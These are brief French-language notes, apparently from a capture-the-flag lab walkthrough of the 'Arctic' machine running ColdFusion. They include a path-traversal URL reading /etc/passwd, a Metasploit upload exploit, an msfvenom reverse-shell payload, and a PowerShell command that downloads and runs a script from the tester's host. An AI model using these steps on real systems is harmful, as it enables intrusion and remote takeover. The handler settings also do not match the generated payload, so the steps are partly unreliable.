ms# Arctic

10.129.22.226

Sur le port 8500 on trouve une applicaiton web : coldfusion.
On sait que en 2010 il y a eu une CVE : CVE-2010-2861

on a une LFI avec le fichier enter.cfm
	Read the file /etc/passwd via http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en

On peut utiliser un module metasploit: 
	msf exploit(windows/http/coldfusion_fckeditor) > search coldfusion
		14  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute

	use 14

	set RHOSTS 10.129.22.226
	set RPORT 8500
	set LHOST 10.10.14.158


Mettre la session en Background (CTRL + Z)


Il faut maintenant utiliser 
	msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.158 LPORT=12345 -f raw -o shell.bat



	use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.14.158
	set LPORT 12345
	exploit -j


	powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.158:8000/shell.bat', 'shell.bat')"
	.\shell.bat
